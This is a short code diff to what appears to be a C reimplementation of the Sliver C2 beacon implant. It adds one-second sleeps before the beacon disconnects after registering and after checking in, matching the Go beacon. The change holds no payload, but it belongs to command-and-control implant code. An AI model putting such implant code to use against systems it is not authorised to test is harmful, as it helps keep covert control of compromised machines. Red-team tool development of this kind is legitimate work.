@@ -296,6 +296,9 @@ int sliver_beacon_run(const char *argv0) {
     }
     sliver_buf_free(&payload);
     sliver_buf_free(&env);
+    /* Give the server time to consume the register frame before the yamux
+     * session is torn down (the Go beacon does the same: Send then Sleep(1s)). */
+    sliver_sleep_ms(1000);
     beacon_disconnect(&conn);
     LOG_INFO("beacon: registered (%s)", id);
   } else {
@@ -368,6 +371,9 @@ int sliver_beacon_run(const char *argv0) {
       sliver_buf_free(&reply);
     }
 
+    /* Mirror the Go beacon's grace period so the server finishes reading the
+     * check-in (and any results) before the connection is closed. */
+    sliver_sleep_ms(1000);
     beacon_disconnect(&conn);
   }
 }
